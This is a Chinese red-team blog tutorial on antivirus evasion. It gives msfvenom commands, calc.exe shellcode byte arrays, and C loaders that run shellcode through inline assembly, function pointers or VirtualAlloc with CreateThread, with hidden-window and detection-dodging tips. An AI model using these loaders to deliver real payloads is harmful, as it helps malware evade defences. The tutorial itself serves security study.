<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2024/11/07/bypassav/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/11/07/bypassav/","path":"2024/11/07/bypassav/","title":"免杀入门"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>免杀入门 | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8"><span class="nav-text">免杀入门</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode%E7%9A%84%E7%BC%96%E5%86%99"><span class="nav-text">shellcode的编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%8A%A8%E7%BC%96%E5%86%99-x"><span class="nav-text">手动编写(x)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c2%E7%94%9F%E6%88%90"><span class="nav-text">c2生成</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode%E7%9A%84%E5%8A%A0%E8%BD%BD"><span class="nav-text">shellcode的加载</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="nav-text">内联汇编</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E6%89%A7%E8%A1%8C"><span class="nav-text">函数指针执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%94%B3%E8%AF%B7%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD"><span class="nav-text">申请动态内存加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%8A%A0%E8%BD%BD"><span class="nav-text">堆加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E8%8A%82%E5%8A%A0%E8%BD%BD"><span class="nav-text">资源节加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#APC%E6%B3%A8%E5%85%A5"><span class="nav-text">APC注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0"><span class="nav-text">基于回调函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%AD%89%E5%BE%85"><span class="nav-text">线程池等待</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BA%A4%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="nav-text">纤程加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8ESEH%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86"><span class="nav-text">基于SEH异常处理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TLS%E6%9C%BA%E5%88%B6"><span class="nav-text">TLS机制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81API%E5%8A%A0%E8%BD%BD"><span class="nav-text">动态API加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5-x"><span class="nav-text">进程注入(x)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode%E7%9A%84%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86"><span class="nav-text">shellcode的混淆加密</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XOR"><span class="nav-text">XOR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AES"><span class="nav-text">AES</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rc4"><span class="nav-text">rc4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%8D%E8%B0%83%E8%AF%95-%E6%B2%99%E7%AE%B1-%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-text">反调试&#x2F;沙箱&#x2F;虚拟机</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1"><span class="nav-text">沙箱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95-%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="nav-text">调试&#x2F;虚拟机</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E7%A6%BB%E9%9D%99%E6%80%81%E5%85%8D%E6%9D%80"><span class="nav-text">分离静态免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%BB%E5%8F%96"><span class="nav-text">本地读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD"><span class="nav-text">远程加载</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B5%84%E6%BA%90%E9%87%8A%E6%94%BE"><span class="nav-text">资源释放</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E5%8A%A8%E6%80%81%E5%85%8D%E6%9D%80"><span class="nav-text">内存动态免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">前置知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E5%A0%86%E5%8A%A0-%E8%A7%A3%E5%AF%86"><span class="nav-text">动态堆加&#x2F;解密</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#minhook"><span class="nav-text">minhook</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E5%86%B3"><span class="nav-text">解决</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98"><span class="nav-text">问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9"><span class="nav-text">属性修改</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E9%A1%BE"><span class="nav-text">回顾</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Malleable-PE-Stage"><span class="nav-text">Malleable PE&#x2F;Stage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%B8%80"><span class="nav-text">问题一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%97%AE%E9%A2%98%E4%BA%8C"><span class="nav-text">问题二</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E6%AC%BA%E9%AA%97"><span class="nav-text">栈欺骗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%8C%E4%B8%BA%E5%AF%B9%E6%8A%97%E5%85%8D%E6%9D%80"><span class="nav-text">行为对抗免杀</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unhook-API"><span class="nav-text">unhook API</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SYSCALL"><span class="nav-text">SYSCALL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%99%BD%E5%8A%A0%E9%BB%91"><span class="nav-text">白加黑</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%A0%86%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-text">堆栈溢出</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%B4%E6%97%B6%E5%85%8D%E6%9D%80"><span class="nav-text">临时免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#golang-syscall"><span class="nav-text">golang syscall</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#c-rc4"><span class="nav-text">c++ rc4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%82%E9%A1%B9"><span class="nav-text">杂项</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B5%84%E6%BA%90"><span class="nav-text">添加资源</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vs%E9%85%8D%E7%BD%AE%E5%85%8D%E6%9D%80"><span class="nav-text">vs配置免杀</span></a></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description"></div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/07/bypassav/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="免杀入门 | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          免杀入门
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-07 21:03:21" itemprop="dateCreated datePublished" datetime="2024-11-07T21:03:21+08:00">2024-11-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Red-Team/" itemprop="url" rel="index"><span itemprop="name">Red-Team</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><h1 id="免杀入门"><a href="#免杀入门" class="headerlink" title="免杀入门"></a>免杀入门</h1><p>环境：cobalt strike 4.4 、自实现profile、全文使用c类型shellcode。</p>
<p>PS：本人水平低下，针对syscall等底层原理内容实在难于下手，免得乱写一通。</p>
<a id="more"></a>

<h1 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h1><h2 id="手动编写-x"><a href="#手动编写-x" class="headerlink" title="手动编写(x)"></a>手动编写(x)</h2><p>手动编写暂时挖坑</p>
<h2 id="c2生成"><a href="#c2生成" class="headerlink" title="c2生成"></a>c2生成</h2><p>利用msf生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode.c</span><br><span class="line">msfvenom -p windows&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode2.c</span><br><span class="line">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f raw -o calc</span><br></pre></td></tr></table></figure>

<p>x64,calc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned char buf[] &#x3D;</span><br><span class="line">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;</span><br><span class="line">&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;</span><br><span class="line">&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;</span><br><span class="line">&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span><br><span class="line">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span><br><span class="line">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;</span><br><span class="line">&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;</span><br><span class="line">&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;</span><br><span class="line">&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;</span><br><span class="line">&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;</span><br><span class="line">&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;</span><br><span class="line">&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;</span><br><span class="line">&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;</span><br><span class="line">&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;</span><br><span class="line">&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;</span><br><span class="line">&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;</span><br><span class="line">&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;</span><br><span class="line">&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;</span><br><span class="line">&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;</span><br><span class="line">&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</span><br></pre></td></tr></table></figure>

<p>x86,calc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned char buf[] &#x3D;</span><br><span class="line">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span><br><span class="line">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="line">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span><br><span class="line">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span><br><span class="line">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span><br><span class="line">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span><br><span class="line">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span><br><span class="line">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span><br><span class="line">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span><br><span class="line">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d&quot;</span><br><span class="line">&quot;\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span><br><span class="line">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span><br><span class="line">&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</span><br></pre></td></tr></table></figure>



<h1 id="shellcode的加载"><a href="#shellcode的加载" class="headerlink" title="shellcode的加载"></a>shellcode的加载</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/henry666/p/17429771.html">总结加载Shellcode的各种方式 - 亨利其实很坏</a></p>
<h2 id="内联汇编"><a href="#内联汇编" class="headerlink" title="内联汇编"></a>内联汇编</h2><p>直接嵌入汇编语言调用shellcode，vs中默认不支持x64，仅支持x32位的shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)   &#x2F;&#x2F;data段可读写  </span><br><span class="line">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D;</span><br><span class="line">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50&quot;</span><br><span class="line">&quot;\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span><br><span class="line">&quot;\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7&quot;</span><br><span class="line">&quot;\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78&quot;</span><br><span class="line">&quot;\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3&quot;</span><br><span class="line">&quot;\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01&quot;</span><br><span class="line">&quot;\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58&quot;</span><br><span class="line">&quot;\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3&quot;</span><br><span class="line">&quot;\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a&quot;</span><br><span class="line">&quot;\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d&quot;</span><br><span class="line">&quot;\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c&quot;</span><br><span class="line">&quot;\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53&quot;</span><br><span class="line">&quot;\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		lea eax,buf</span><br><span class="line">		call eax</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>mov eax, offset ShellCode 可以用 lea eax, ShellCode 代替</p>
<p>jmp 也可以用 call 代替</p>
<p><strong>添加花指令：</strong></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46296905/article/details/117336574">花指令简析_花指令生成</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] &#x3D;&quot;&quot;;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">    &#123;</span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h2><p><strong>将buf的首地址强转为函数指针并调用,而buf的首地址内容为shellcode</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)  &#x2F;&#x2F;data段可读写执行</span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;) &#x2F;&#x2F;不显示windows窗口  </span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	( (void(*)(void)) &amp; buf)();</span><br><span class="line">	&#x2F;&#x2F; ( (void(WINAPI*)(void)) &amp; buf)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>理解 <code>(*(void (*)()) lpBaseAddress)()</code></p>
<p>就是把从指定地址开始的命令当作函数进行调用执行。</p>
<ol>
<li><code>void (*)()</code> 是一个无参数、无返回类型的函数指针。</li>
<li><code>(void (*)())lpBaseAddress</code> 是将lpBaseAddress强转为函数指针类型。</li>
<li><code>(*(void (*)()) lpBaseAddress)()</code> 就是通过函数指针(相当于这个格式<code>(*函数指针)()</code>)进行函数调用。</li>
</ol>
<p>没有调用WinApi，可对shellcode进行加密编码</p>
<h2 id="申请动态内存加载"><a href="#申请动态内存加载" class="headerlink" title="申请动态内存加载"></a>申请动态内存加载</h2><p>通过调用winapi：VirtualAlloc 主要用于在进程的虚拟地址空间中分配一块内存，这块内存可以被用于多种目的，包括作为堆、栈、映射文件等。将shellcode复制到申请的地址，通过 函数指针执行 或 创建线程执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">申请内存页时，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。这样也能规避掉一些特征查杀。</span><br></pre></td></tr></table></figure>

<p><strong>函数指针执行：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;Windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;) &#x2F;&#x2F;windows控制台程序不出黑窗口</span><br><span class="line">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	char *Memory; </span><br><span class="line">	Memory&#x3D;VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	memcpy(Memory, buf, sizeof(buf));</span><br><span class="line">	((void(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>创建线程执行：</strong></p>
<p>在创建线程时需要进行等待子线程完成，sleep一会或者WaitForSingleObject等待信号</p>
<blockquote>
<p>main退出时自动调用ExitProcess()，操作系统终止所有运行的线程。WaitForSingleObject保证main在子线程运行期间不返回。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(linker,&quot;&#x2F;subsystem:\&quot;windows\&quot; &#x2F;entry:\&quot;mainCRTStartup\&quot;&quot;)  </span><br><span class="line">unsigned char buf[] &#x3D;&quot;shellcode is here&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    LPVOID pMemory &#x3D; VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    RtlMoveMemory(pMemory, buf, sizeof(buf));</span><br><span class="line">    HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pMemory, NULL, 0, NULL);</span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">    VirtualFree(pMemory, 0, MEM_RELEASE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="堆加载"><a href="#堆加载" class="headerlink" title="堆加载"></a>堆加载</h2><p>类似于动态申请内存，只不过申请的是堆空间</p>
